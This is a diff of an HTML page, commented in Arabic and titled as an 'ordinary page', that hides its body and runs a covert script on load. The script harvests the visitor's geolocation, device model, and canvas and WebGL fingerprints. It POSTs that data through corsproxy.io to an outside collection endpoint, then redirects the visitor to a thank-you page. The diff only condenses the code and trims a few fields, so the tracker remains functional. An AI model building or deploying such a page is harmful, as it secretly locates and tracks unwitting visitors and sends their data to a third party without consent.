@@ -4,25 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صفحة عادية</title>
-    <style> 
-        body { display: none; } 
-        /* إخفاء كامل للصفحة */
-    </style>
+    <style> body { display: none; } </style>
 </head>
 <body>
     <script>
-        // === استخدم API حقيقي عبر corsproxy.io لتجنب CORS ===
+        // === الـ URL الصحيح: يمر عبر corsproxy.io ===
         const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
 
-        // === 1. استخراج اسم الجهاز ===
+        // === باقي الكود (بدون تغيير) ===
         async function parseDeviceName(ua) {
             try {
                 if (navigator.userAgentData) {
                     const hints = await navigator.userAgentData.getHighEntropyValues(["model", "brand"]);
                     if (hints?.model) return `${hints.brand} ${hints.model}`;
                 }
-            } catch (e) { /* تجاهل الأخطاء */ }
-
+            } catch (e) {}
             const patterns = [
                 { name: 'Samsung Galaxy S24', pattern: /samsung.*sm-s92/i },
                 { name: 'iPhone 15', pattern: /iphone.*15/i },
@@ -32,59 +28,38 @@
             return /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
         }
 
-        // === 2. الموقع الجغرافي ===
         async function getGeolocation() {
             return new Promise(resolve => {
-                if (!navigator.geolocation) {
-                    return resolve({ error: 'غير مدعوم' });
-                }
+                if (!navigator.geolocation) return resolve({ error: 'غير مدعوم' });
                 navigator.geolocation.getCurrentPosition(
-                    pos => resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        acc: pos.coords.accuracy || 0
-                    }),
+                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy || 0 }),
                     () => resolve({ error: 'مرفوض' }),
                     { timeout: 10000 }
                 );
             });
         }
 
-        // === 3. بصمة Canvas ===
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('OSINT', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('OSINT', 4, 17);
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = '#069'; ctx.fillText('OSINT', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('OSINT', 4, 17);
                 return canvas.toDataURL();
-            } catch (e) {
-                return 'خطأ في Canvas';
-            }
+            } catch (e) { return 'خطأ'; }
         }
 
-        // === 4. بصمة WebGL ===
         function getWebGLFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (!gl) return 'غير مدعوم';
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo 
-                    ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) 
-                    : gl.getParameter(gl.RENDERER);
-            } catch (e) {
-                return 'غير متاح';
-            }
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+            } catch (e) { return 'غير متاح'; }
         }
 
-        // === 5. تجميع البصمة ===
         function hashCode(str) {
             let hash = 0;
             for (let i = 0; i < str.length; i++) {
@@ -99,24 +74,14 @@
             try {
                 const canvas = getCanvasFingerprint();
                 const webgl = getWebGLFingerprint();
-                const fonts = Array.from(document.fonts).map(f => f.family).join(',');
-                const plugins = Array.from(navigator.plugins).map(p => p.name).join(',');
-                const str = `${canvas}${webgl}${navigator.hardwareConcurrency || 0}${screen.colorDepth}${fonts}${plugins}`;
+                const str = `${canvas}${webgl}${navigator.hardwareConcurrency || 0}${screen.colorDepth}`;
                 return hashCode(str);
-            } catch (e) {
-                return 'خطأ في البصمة';
-            }
+            } catch (e) { return 'خطأ'; }
         }
 
-        // === 6. التنفيذ الرئيسي (مع معالجة الأخطاء) ===
         (async () => {
             try {
-                // جمع البيانات
-                const [geo, deviceName] = await Promise.all([
-                    getGeolocation(),
-                    parseDeviceName(navigator.userAgent)
-                ]);
-
+                const [geo, deviceName] = await Promise.all([getGeolocation(), parseDeviceName(navigator.userAgent)]);
                 const fingerprint = generateFingerprint();
 
                 const data = {
@@ -139,37 +104,21 @@
                     entryUrl: window.location.href
                 };
 
-                // إرسال البيانات
                 const response = await fetch(apiUrl, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data),
-                    mode: 'cors',
-                    cache: 'no-cache',
-                    redirect: 'follow'
+                    mode: 'cors'
                 });
 
-                if (response.ok) {
-                    console.log('تم إرسال البيانات بنجاح!');
-                } else {
-                    console.warn('فشل الإرسال:', response.status, response.statusText);
-                }
+                if (response.ok) console.log('تم الإرسال!');
+                else console.warn('فشل:', response.status);
 
-            } catch (error) {
-                console.error('خطأ في الجمع:', error.message || error);
-                // لا تُوقف التنفيذ – استمر في التوجيه
+            } catch (e) {
+                console.error('خطأ:', e);
             } finally {
-                // إعادة توجيه مهما حدث
                 setTimeout(() => {
-                    try {
-                        window.location.href = 'https://example.com/thank-you';
-                    } catch (e) {
-                        // إذا فشل التوجيه، حاول مرة أخرى
-                        window.location = 'https://example.com/thank-you';
-                    }
+                    window.location.href = 'https://example.com/thank-you';
                 }, 500);
             }
         })();
